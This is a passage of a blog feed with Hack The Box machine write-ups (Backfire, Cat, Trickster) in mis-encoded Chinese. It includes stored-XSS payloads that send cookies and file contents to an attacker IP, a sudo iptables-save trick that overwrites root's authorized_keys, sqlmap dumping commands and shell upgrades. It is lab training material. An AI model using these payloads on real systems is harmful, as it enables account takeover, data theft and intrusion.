    
    
    <categories>
      
      <category>Linuxé¶æœºä¸­çº§</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HTB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB-Backfire</title>
    <link href="/2025/02/02/HTB-Backfire/"/>
    <url>/2025/02/02/HTB-Backfire/</url>
    
    <content type="html"><![CDATA[<h1 id="HTB-Backfire"><a href="#HTB-Backfire" class="headerlink" title="HTB-Backfire"></a>HTB-Backfire</h1><h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>8000 22 443ç«¯å£å¼€å¯ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501201047681.png" alt="image-20250120104720463"></p><p>è®¿é—®8000ç«¯å£ å‘ç°æœ‰ä¸¤ä¸ªæ–‡ä»¶</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501201051480.png" alt="image-20250120105106407"></p><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>ä¸‹è½½ä¸‹æ¥çœ‹çœ‹ å‘ç°æ˜¯ä¸€ä¸ªHavoc</p><p>ç»è¿‡æœç´¢å¾—åˆ°ä¸€ä¸ªSSRFçš„æ¼æ´ å‚è€ƒé“¾æ¥ï¼š<a href="https://github.com/HimmeL-Byte/CVE-2024-41570-SSRF-RCE">https://github.com/HimmeL-Byte/CVE-2024-41570-SSRF-RCE</a></p><p>å°è¯•ç€æ‰“ä¸€ä¸‹ å‘ç°å¯ä»¥ </p><p>ç™»å½•è¿›å»ä¹‹åå‘ç°shellå¹¶ä¸é•¿ä¹… æˆ‘ä»¬å¯ä»¥é€šè¿‡sshçš„å…¬ç§é’¥å¯¹ è¿›è¡Œä¸€ä¸ªsshçš„æŒä¹…åŒ–ã€‚</p><p>é¦–å…ˆè¾“å…¥ ssh-keygen è®©ç³»ç»Ÿç”Ÿæˆä¸€ä¸ªå…¬é’¥å’Œç§é’¥ ç„¶åæˆ‘ä»¬å°†å…¬é’¥æ”¾åœ¨authorized_keysä¸­ å¹¶ä¸”èµ‹äºˆæƒé™600 å¯¹.sshèµ‹äºˆ700çš„æƒé™</p><p>å°†ç§é’¥æ‹‰ä¸‹æ¥ ç„¶ååŒæ ·èµ‹äºˆ600æƒé™ æœ€ååˆ©ç”¨ç§é’¥è¿›è¡Œsshç™»å½•ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501212057866.png" alt="image-20250121205735620"></p><p>homeç›®å½•ä¸‹å­˜åœ¨ä¸¤ä¸ªç”¨æˆ· ä¸‹ä¸€æ­¥è¦è·å–å¦å¤–ä¸€ä¸ªç”¨æˆ·çš„æƒé™ã€‚</p><p>netstat -tuln çœ‹ä¸€ä¸‹ å‘ç°ä¸¤ä¸ªå†…éƒ¨çš„ç«¯å£ sshæ˜ å°„ä¸€ä¸‹ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501212114686.png" alt="image-20250121211421473"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ssh</span> -L <span class="hljs-number">7096</span>:<span class="hljs-number">127.0.0.1:7096</span> -L <span class="hljs-number">5000</span>:<span class="hljs-number">127.0.0.1:5000</span> ilya@<span class="hljs-number">10.10.11.49</span> -i id_rsa<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501212127121.png" alt="image-20250121212752925"></p><p>æœç´¢åˆ°ä¸€ä¸ªèº«ä»½éªŒè¯ç»•è¿‡çš„æ¼æ´ã€‚</p><p><a href="https://github.com/thisisveryfunny/HardHat-C2-Auth-Bypass/tree/main">https://github.com/thisisveryfunny/HardHat-C2-Auth-Bypass/tree/main</a></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501212153785.png" alt="image-20250121215349572"></p><p>ä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªç”¨æˆ·å’Œå¯†ç è®©å»ç™»å½•ã€‚</p><p>ç„¶åå°†å…¬é’¥æ–‡ä»¶è¾“å…¥åˆ°åŒæ ·çš„æ–‡ä»¶ä¸­</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">echo <span class="hljs-string">&quot;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINm/pUT/9gMKllPLVgrNw8VMetEBvjG5IuKq3qjCSHSP ilya@backfire&quot;</span> &gt;&gt;<span class="hljs-regexp">/home/</span>sergej<span class="hljs-regexp">/.ssh/</span>authorized_keys<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501212233779.png" alt="image-20250121223321587"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501212233098.png" alt="image-20250121223337004"></p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>sudo -l çœ‹ä¸€ä¸‹ å‘ç°å¯ä»¥iptableså’Œiptables-saveææƒ</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501212235334.png" alt="image-20250121223538200"></p><p>å‚è€ƒé“¾æ¥ï¼š<a href="https://cn-sec.com/archives/3193918.html">https://cn-sec.com/archives/3193918.html</a></p><p>å°±æ˜¯å°†å…¬é’¥æ–‡ä»¶ä»¥æ³¨é‡Šçš„æ–¹å¼æ·»åŠ åˆ°è§„åˆ™ä¸­ ç„¶ååˆ©ç”¨iptables -save è¿›è¡Œä¸€ä¸ªè¦†ç›–ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo /usr/sbin/iptables -A INPUT -i lo -j ACCEPT -m comment --comment $<span class="hljs-string">&#x27;\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINm/pUT/9gMKllxxxxxw8VMetEBvjG5IuKq3qjCSHSP ilya@backfire\n&#x27;</span><br>sudo /usr/sbin/iptables-save -f /root/.ssh/authorized_keys<br>sudo /usr/sbin/iptables -S<br></code></pre></td></tr></table></figure><p>ä¹‹å‰çš„é‚£ä¸ªå…¬é’¥æçš„å¤ªé•¿äº† åé¢åˆæ¢äº†ä¸€ä¸ª</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">ssh-keygen -<span class="hljs-built_in">t</span> <span class="hljs-symbol">ed25519</span><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501212353586.png" alt="image-20250121235316188"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501220004040.png" alt="image-20250122000457903"></p>]]></content>
    
    
    <categories>
      
      <category>Linuxé¶æœºä¸­çº§</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HTB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB-cat</title>
    <link href="/2025/02/02/HTB-cat/"/>
    <url>/2025/02/02/HTB-cat/</url>
    
    <content type="html"><![CDATA[<h1 id="HTB-cat"><a href="#HTB-cat" class="headerlink" title="HTB-cat"></a>HTB-cat</h1><p>ä¿¡æ¯æ”¶é›† 22 80ç«¯å£å¼€æ”¾ ç„¶åå°†cat.htbæ·»åŠ åˆ°/etc/hostsä¸­ æ‰«æåå° å‘ç°gitæ³„éœ²</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502022329569.png" alt="image-20250202232937210"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502051605560.png" alt="image-20250205160532764"></p><p>å°†gitæ³„éœ²çš„ä»£ç æ‹‰ä¸‹æ¥å®¡è®¡ å‘ç°ä¸€ä¸ªxssçš„</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502052243939.png" alt="image-20250205224300650"></p><p>usernameå’Œemailæœªç»è¿‡éªŒè¯å°±è¢«å†™è¿›æ•°æ®åº“ä¸­ï¼Œè¿™é‡Œèƒ½å†™å…¥å­˜å‚¨å‹çš„xss</p><p>è·å–cookie:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script&gt;<span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>=<span class="hljs-string">&#x27;http://10.10.14.68:8888/?c=&#x27;</span>+<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>;&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬è™½ç„¶å†™è¿›å»äº†ï¼Œä½†æ˜¯ä»ç„¶éœ€è¦æ‰¾ä¸€ä¸ªåœ°æ–¹æ¥è§¦å‘ã€‚</p><p>åœ¨ä¸Šä¼ æ–‡ä»¶çš„è¿™ä¸ªåœ°æ–¹ï¼Œå½“æˆ‘ä»¬æ»¡è¶³ä¸Šä¼ çš„æ¡ä»¶çš„æ—¶å€™ï¼Œå®ƒå°±ä¼šå†æ¬¡è°ƒç”¨æˆ‘ä»¬æ³¨å†Œçš„ç”¨æˆ·ï¼Œå³é‚£ä¸ªæ¶æ„çš„xssä»£ç ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502052309084.png" alt="image-20250205230911970"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502052309293.png" alt="image-20250205230954209"></p><p>é¦–å…ˆæ³¨å†Œä¸€ä¸ªç”¨æˆ· ä¸Šé¢çš„payloadæ˜¯ç”¨æˆ·å ç„¶åç™»å½•è¿›å»ï¼Œéšä¾¿ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡ï¼Œè¿›è¡Œç›‘å¬å³å¯ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502052105092.png" alt="image-20250205210509958"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502052105815.png" alt="image-20250205210501483"></p><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>å½“æˆ‘ä»¬å¼¹åˆ°cookieçš„æ—¶å€™(æ›´æ¢èº«ä»½)ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨sqlæ³¨å…¥æ¼æ´ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502052306930.png" alt="image-20250205230607807"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$cat_name</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;catName&#x27;</span>];<br>           <span class="hljs-variable">$catId</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;catId&#x27;</span>];<br>           <span class="hljs-variable">$sql_insert</span> = <span class="hljs-string">&quot;INSERT INTO accepted_cats (name) VALUES (&#x27;<span class="hljs-variable">$cat_name</span>&#x27;)&quot;</span>;<br>           <span class="hljs-variable">$pdo</span>-&gt;<span class="hljs-built_in">exec</span>(<span class="hljs-variable">$sql_insert</span>);<br></code></pre></td></tr></table></figure><p>$cat_nameæ˜¯å¯ä»¥æ§åˆ¶çš„ï¼Œåˆ©ç”¨sqlmapè·‘å³å¯ã€‚</p><p>å°†å…¶è½¬æˆtxtæ–‡ä»¶ ç„¶åæ”¾åˆ°sqlmapä¸­è·‘ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502061632759.png" alt="image-20250206163238791"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sqlmap -r <span class="hljs-string">&#x27;/home/fsrm/Desktop/cat.txt&#x27;</span> <span class="hljs-attribute">--level</span>=5 --tables --dump <span class="hljs-attribute">--risk</span>=3 <span class="hljs-attribute">--dbms</span>=sqlite <span class="hljs-attribute">--threads</span>=10 -p <span class="hljs-string">&quot;catName&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502061707533.png" alt="image-20250206170744228"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">sqlmap -r <span class="hljs-string">&#x27;/home/fsrm/Desktop/cat.txt&#x27;</span> <span class="hljs-attr">--level</span>=<span class="hljs-number">5</span> <span class="hljs-attr">--dump</span> <span class="hljs-attr">--risk</span>=<span class="hljs-number">3</span> <span class="hljs-attr">--dbms</span>=sqlite <span class="hljs-attr">--threads</span>=<span class="hljs-number">10</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-string">&quot;catName&quot;</span> -T <span class="hljs-string">&quot;users&quot;</span> <span class="hljs-comment">//æŒ‡å®šæŸ¥çœ‹usersè¡¨ä¸­çš„å†…å®¹</span><br></code></pre></td></tr></table></figure><p>å¯¹rosaçš„å¯†ç è¿›è¡Œç ´è§£ èƒ½å¾—åˆ°md5åŠ å¯†ä¹‹å‰çš„ã€‚</p><p><a href="https://crackstation.net/">https://crackstation.net/</a></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502061733523.png" alt="image-20250206173346328"></p><p>ç„¶åsshç™»å½•ä¸Šå»çœ‹çœ‹ã€‚</p><p>åœ¨æ—¥å¿—æ–‡ä»¶é‡Œé¢å‘ç°äº†axelçš„ç™»å½•å¯†ç ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502061741613.png" alt="image-20250206174144320"></p><p>å†æ¬¡sshç™»å½•ä¸Šå»ã€‚é‡Œé¢å­˜æ”¾ç€user.txt</p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>åœ¨var/mailä¸‹å‘ç°ä¸€ä¸ªé‚®ä»¶ æŸ¥çœ‹ä¸€ä¸‹å‘ç°æ˜¯ä¸€ä¸ªå†…ç½‘çš„æœåŠ¡ ç«¯å£æ˜¯3000 è½¬å‘ä¸€ä¸‹ã€‚</p><p>æ˜¯ä¸€ä¸ªGiteaç‰ˆæœ¬ä¿¡æ¯æ˜¯1.22.0 ç½‘ä¸Šæœä¸€ä¸‹ å‘ç°ä¸€ä¸ªxss</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502061946855.png" alt="image-20250206194622664"></p><p><a href="https://www.exploit-db.com/exploits/52077">https://www.exploit-db.com/exploits/52077</a></p><p>åˆ©ç”¨axelçš„è´¦å·å¯†ç èƒ½ç™»å½•è¿›å» </p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502061957065.png" alt="image-20250206195744978"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml">æ¼æ´åˆ©ç”¨ï¼š<br><br>1.é¦–å…ˆåˆ›å»ºä¸€ä¸ªæ–°çš„ä»“åº“æˆ–è€…ä¿®æ”¹ç°æœ‰ä»“åº“<br><br>2.åœ¨ä»“åº“æè¿°é‚£ä¸ªåœ°æ–¹æ·»åŠ xssçš„payload  //<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">javascript:alert()</span>&gt;</span>XSS test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><br>3.ä¿å­˜é¡¹ç›® ç„¶åç‚¹å‡»é¡¹ç›®çš„æè¿° å°±ä¼šè§¦å‘xss<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502062006963.png" alt="image-20250206200650885"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript:fetch(&#x27;http://10.10.14.68:1234/?d=&#x27;+encodeURIComponent(btoa(document.cookie)));&quot;</span>&gt;</span>XSS test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><p>æ³¨æ„å‰é¢çš„é‚®ä»¶ä¸­ æœ‰ä¸€ä¸ªå¾ˆé‡è¦çš„åœ°æ–¹ã€‚</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs smali">We are planning to launch<span class="hljs-built_in"> new </span>cat-related web services, including a cat care website<span class="hljs-built_in"> and </span>other projects. Please send an email to jobert@localhost with information about your Gitea repository. Jobert will<span class="hljs-built_in"> check </span>if it is a promising service that we can develop.<br><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502062209615.png" alt="image-20250206220913482"></p><p>å°±æ˜¯éœ€è¦å°†æˆ‘ä»¬åˆ›å»ºçš„ä»“åº“é€šè¿‡é‚®ç®±å‘é€ç»™jobert è®©jobertæ¥è§¦å‘è¿™ä¸ªxss è€Œä¸æ˜¯æˆ‘ä»¬æ‰‹åŠ¨å»è§¦å‘</p><p>å‘é€é‚®ä»¶ï¼š</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs swift">echo <span class="hljs-operator">-</span>e <span class="hljs-string">&quot;Subject: Test Email<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>Hello,repo http://localhost:3000/axel/test&quot;</span> <span class="hljs-operator">|</span> sendmail jobert<span class="hljs-meta">@cat</span>.htb<br></code></pre></td></tr></table></figure><p>æ³¨æ„åˆ›å»ºçš„ä»“åº“éœ€è¦ä¼ ä¸€ä¸ªæ–‡ä»¶ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502062240638.png" alt="image-20250206224038457"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502062241681.png" alt="image-20250206224117412"></p><p>ç„¶åå°±æ˜¯ä¸€ä¸ªè·å–mdæ–‡ä»¶çš„payload</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">&lt;a href=&#x27;javascript:fetch(<span class="hljs-string">&quot;http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md&quot;</span>).<span class="hljs-keyword">then</span>(response=&gt;response.text<span class="hljs-literal">()</span>).<span class="hljs-keyword">then</span>(data=&gt;fetch(<span class="hljs-string">&quot;http://10.10.14.68:1234/?d=&quot;</span>+encode<span class="hljs-constructor">URIComponent(<span class="hljs-params">btoa</span>(<span class="hljs-params">unescape</span>(<span class="hljs-params">encodeURIComponent</span>(<span class="hljs-params">data</span>)</span>)))));&#x27;&gt;XSS test&lt;/a&gt;<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502062249329.png" alt="image-20250206224909187"></p><p>è§£ç åçš„å†…å®¹ï¼š</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"># Employee Management<br>Site under construction. Authorized <span class="hljs-keyword">user</span>: <span class="hljs-keyword">admin</span>. <span class="hljs-keyword">No</span> visibility <span class="hljs-keyword">or</span> updates visible <span class="hljs-keyword">to</span> employees.<br></code></pre></td></tr></table></figure><p>æ²¡å•¥ç”¨ çŸ¥çŸ¥é“ç”¨æˆ·åä¸çŸ¥é“å¯†ç ï¼Œçœ‹çœ‹é™¤äº†mdæ–‡ä»¶ä¹‹å¤–æ˜¯å¦è¿˜æœ‰å…¶ä»–æ–‡ä»¶çš„å­˜åœ¨ï¼Œå…ˆè¯•è¯•index.php</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">&lt;a href=&#x27;javascript:fetch(<span class="hljs-string">&quot;http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php&quot;</span>).<span class="hljs-keyword">then</span>(response=&gt;response.text<span class="hljs-literal">()</span>).<span class="hljs-keyword">then</span>(data=&gt;fetch(<span class="hljs-string">&quot;http://10.10.14.68:1234/?d=&quot;</span>+encode<span class="hljs-constructor">URIComponent(<span class="hljs-params">btoa</span>(<span class="hljs-params">unescape</span>(<span class="hljs-params">encodeURIComponent</span>(<span class="hljs-params">data</span>)</span>)))));&#x27;&gt;XSS test&lt;/a&gt;<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502062256183.png" alt="image-20250206225610998"></p><p>è¿˜çœŸæœ‰ä¸œè¥¿ã€‚</p><p>è§£ç ä¹‹åæ˜¯adminçš„å¯†ç ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502062256444.png" alt="image-20250206225656388"></p><p>å†æ¬¡å°è¯•ç™»å½•å‘ç°ä¸å¯¹ï¼ŒçŒœæµ‹å¯èƒ½æ˜¯rootçš„å¯†ç  suçœ‹ä¸€ä¸‹ï¼ŒææƒæˆåŠŸã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502062259845.png" alt="image-20250206225941665"></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>é¦–å…ˆé€šè¿‡gitæ³„éœ²æŸ¥çœ‹ä»£ç è¿›è¡Œå®¡è®¡ï¼Œæ‰¾åˆ°ä¸€ä¸ªsqlæ³¨å…¥çš„åœ°æ–¹ï¼Œä½†å‰æéœ€è¦axelèº«ä»½ï¼Œç”¨åˆ°è¿™ä¸ªèº«ä»½å°±éœ€è¦é€šè¿‡å­˜å‚¨å‹xssè·å–cookieï¼Œé€šè¿‡æ–‡ä»¶ä¸Šä¼ è§¦å‘xssï¼Œç„¶ååˆ©ç”¨sqlmapå°†usersè¡¨ä¸­çš„æ•°æ®çˆ†ç ´å‡ºæ¥ï¼Œé€ä¸ªç ´è§£å¾—åˆ°rosaçš„å¯†ç ï¼Œsshç™»å½•è¿›å»ï¼Œåœ¨æ—¥å¿—æ–‡ä»¶çš„åœ°æ–¹æ‰¾åˆ°axelçš„sshå¯†ç ï¼Œç„¶åå†æ¬¡ç™»å½•ï¼Œé€šè¿‡é‚®ä»¶ä¿¡æ¯çŸ¥é“å­˜åœ¨å†…ç½‘ï¼Œç«¯å£æ˜ å°„å‡ºæ¥ï¼ŒæŸ¥æ‰¾æ˜¯ä¸€ä¸ªxss,è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ä¸è¦è‡ªå·±æ‰‹åŠ¨è§¦å‘xss,è€Œæ˜¯éœ€è¦å‘é€é‚®ä»¶ï¼Œè®©å¦å¤–ä¸€ä¸ªç”¨æˆ·å»è§¦å‘ï¼Œä»è€Œè·å–åˆ°æœªæˆæƒçš„æ–‡ä»¶å†…å®¹ï¼Œè¯»å–mdæ–‡ä»¶æ— æœï¼ŒæŸ¥çœ‹æ˜¯å¦å­˜åœ¨å…¶ä»–æ–‡ä»¶ï¼Œå¾—åˆ°index.php,ç„¶åå¾—åˆ°rootçš„å¯†ç ï¼Œæœ€åææƒå³å¯ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Linuxé¶æœºä¸­çº§</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HTB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB-Trickster</title>
    <link href="/2025/01/25/HTB-Trickster/"/>
    <url>/2025/01/25/HTB-Trickster/</url>
    
    <content type="html"><![CDATA[<h1 id="HTB-Trickster"><a href="#HTB-Trickster" class="headerlink" title="HTB-Trickster"></a>HTB-Trickster</h1><p>linux ä¸­ç­‰éš¾åº¦</p><h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>ç«¯å£æ‰«æå‘ç°22å’Œ80ç«¯å£å¼€æ”¾</p><p>è®¿é—®80ç«¯å£ å‘ç°å¹¶ä¸èƒ½è®¿é—®å®ƒçš„æœåŠ¡ åšä¸€ä¸‹æ˜ å°„ å°†åŸŸåæ·»åŠ åˆ°/etc/hostsä¸­ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501251957752.png" alt="image-20250125195700473"></p><p> <img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501251958754.png" alt="image-20250125195823382"></p><p>ç¬¬ä¸€ä¸ªç½‘ç«™æ‰«åå°æ‰«åˆ°äº†ä¸€ä¸ªassets æ²¡æ‰¾åˆ°ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501252013038.png" alt="image-20250125201314949"></p><p>ç¬¬äºŒä¸ªç½‘ç«™æ˜¯ä¸€ä¸ªPrestaSHop ç½‘ä¸Šæœäº†å¤§éƒ¨åˆ†æ˜¯sqlæ³¨å…¥æ¼æ´  æ³¨å†Œä¸€ä¸ªè´¦æˆ·ç™»å½•è¿›å»çœ‹çœ‹ã€‚</p><p>æ²¡å•¥ä¸œè¥¿ï¼Œæ‰«åå°å¯ä»¥çŸ¥é“æ˜¯ä¸€ä¸ªgitæ³„éœ² åˆ©ç”¨GitHackå»æ‰«ä¸€ä¸‹ ç„¶åèƒ½å¾—åˆ°ä¸€ä¸ªè·¯å¾„ï¼Œè®¿é—®å¾—çŸ¥æ˜¯ä¸€ä¸ªåå°çš„è·¯å¾„ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501252215517.png" alt="image-20250125221548383"></p><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><h3 id="CVE-2024-34716"><a href="#CVE-2024-34716" class="headerlink" title="CVE-2024-34716"></a>CVE-2024-34716</h3><p>å¾—çŸ¥åˆ°ç‰ˆæœ¬ä¿¡æ¯ æ˜¯8.1.5 æœåˆ°ä¸€ä¸ªCVE-2024-34716</p><p>å‚è€ƒåœ°å€ï¼š<a href="https://ayoubmokhtar.com/post/png_driven_chain_xss_to_remote_code_execution_prestashop_8.1.5_cve-2024-34716/">https://ayoubmokhtar.com/post/png_driven_chain_xss_to_remote_code_execution_prestashop_8.1.5_cve-2024-34716/</a></p><p>ç„¶ååˆ©ç”¨é‡Œé¢çš„è„šæœ¬åå¼¹shellå³å¯ï¼Œå¦‚æœncatæ²¡æœ‰çš„è¯ å°±æ¢æˆnc</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501261709363.png" alt="image-20250126170921095"></p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>åˆ©ç”¨pythonæä¸€ä¸ªäº¤äº’shell</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">python3 -c <span class="hljs-symbol">&#x27;import</span> pty;pty.spawn(<span class="hljs-string">&quot;/bin/bash&quot;</span>)&#x27;<br></code></pre></td></tr></table></figure><p>é¦–å…ˆåˆ°homeç›®å½•ä¸‹æŸ¥çœ‹æœ‰å‡ ä¸ªç”¨æˆ·ï¼Œä¸€èˆ¬ä»è¿™äº›ç”¨æˆ·ä¸‹æ‰‹ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501261716637.png" alt="image-20250126171623507"></p><p>ä¸‹é¢å¾€æ•°æ®åº“è¿™æ–¹é¢ç€æ‰‹ï¼Œå»çœ‹ä¸€ä¸‹config</p><p>æ‰¾åˆ°ä¸‹é¢è¿™ä¸ªä¿¡æ¯ å»çœ‹ä¸€ä¸‹ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501261745026.png" alt="image-20250126174538946"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501261748753.png" alt="image-20250126174810630"></p><p>mysql è¿æ¥ä¸Šå»çœ‹çœ‹ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501262003844.png" 